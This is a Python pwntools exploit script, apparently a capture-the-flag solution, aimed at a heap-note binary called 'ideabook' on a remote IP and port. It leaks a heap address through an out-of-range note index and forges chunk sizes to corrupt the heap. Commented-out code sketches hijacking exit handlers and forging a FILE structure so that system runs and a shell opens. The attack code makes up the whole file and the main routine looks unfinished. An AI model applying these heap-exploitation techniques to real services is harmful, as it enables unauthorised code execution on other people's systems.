from pwn import *
import sys
import os
#Cre: vilex1337

_path = "./ideabook_patched"
exe = context.binary = ELF(_path, checksec=False)
libc = ELF("./libc.so.6", checksec=False)
#ld = ELF("./ld-linux-x86-64.so.2", checksec=False)
add = '34.170.146.252'
port = 17253
cmd = f'''
    set solib-search-path {os.getcwd()}
    b *main+77
    b *main+532
    b *main+490
    continue
    set {'{long[17]}'} &note_list={'{0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}'}
'''
_mode = 0
_arch = 64

def conn():
    global _mode
    if(len(sys.argv) == 1):
        _mode = 2
        return gdb.debug(_path, cmd)
    if(sys.argv[1] == 'exp'):
        _mode = 3
        return remote(add, port)
    _mode = 1
    return process(_path)

rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

ror = lambda val, r_bits, max_bits: \
    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))

def encrypt(v, key):
    return p(rol(v ^ key, 0x11, 64))

#############  next | count  | type (cxa) | addr                             | arg               | not used
#onexit_fun =  p(0) + p(1)  +  p(4)       + encrypt(libc.sym['system'], key) + p(heap + 0x2c0)  +  p(0)
'''
_op_file = FileStructure()
_op_file.unknown2 = p(0)*2 + p(libc.sym["system"]) + p(0)*3 + p(libc.sym["_IO_wfile_jumps"] - 0x20 ) + p(libc.sym["_IO_2_1_stdout_"] +0x50)
_op_file._wide_data = libc.sym["_IO_2_1_stdout_"]
_op_file.flags = 0xfbad20b1 + (int.from_bytes(b';sh;', 'little') << 32)
_op_file._lock = libc.address + 0x21a200
_tmp_file = bytes(_op_file)
'''

def p(_data):
    if(_arch == 64):
        return p64(_data, endian = 'little')
    return p32(_data, endian = 'little')

chall = conn()

def _send(_rgx, _data):
    chall.sendafter(_rgx, _data)

def _sendline(_rgx, _data):
    chall.sendlineafter(_rgx, _data)

#rop = ROP(libc)
#rop.find_gadget(['pop rdi', 'ret'])[0]
#log.info

def _create(_idx, _size):
    _sendline(b'> ', b'1')
    _sendline(b'Index: ', str(_idx).encode())
    _sendline(b'Size: ', str(_size).encode())

def _edit(_idx, _data):
    _sendline(b'> ', b'2')
    _sendline(b'Index: ', str(_idx).encode())
    _send(b'Content: ', _data)

def _read(_idx):
    _sendline(b'> ', b'3')
    _sendline(b'Index: ', str(_idx).encode())

def _del(_idx):
    _sendline(b'> ', b'4')
    _sendline(b'Index: ', str(_idx).encode())

def check():
    chall.interactive()
    exit()

def main():
    _create(16, 0)
    _create(1, 0xf0)
    _create(2, 0xf0)
    _del(1)
    _create(0, 0x100)
    for i in range(4):
        _create(i + 3, 0x100)
    _read(16)
    chall.recvuntil(b'Content: ')
    chall.recv(0x20)
    _heap = int.from_bytes(chall.recv(8), 'little')
    log.info(f"Heap: {hex(_heap)}")
    payload = b'a' * 0x118 + p(0x441) + b'\n'
    _create(1, 0xf0)
    _edit(16, payload)
    _edit(5, p(0x21) * (int(0x100 / 8) - 1) + b'\n')
    _del(2)
    check()

if __name__ == "__main__":
    main()
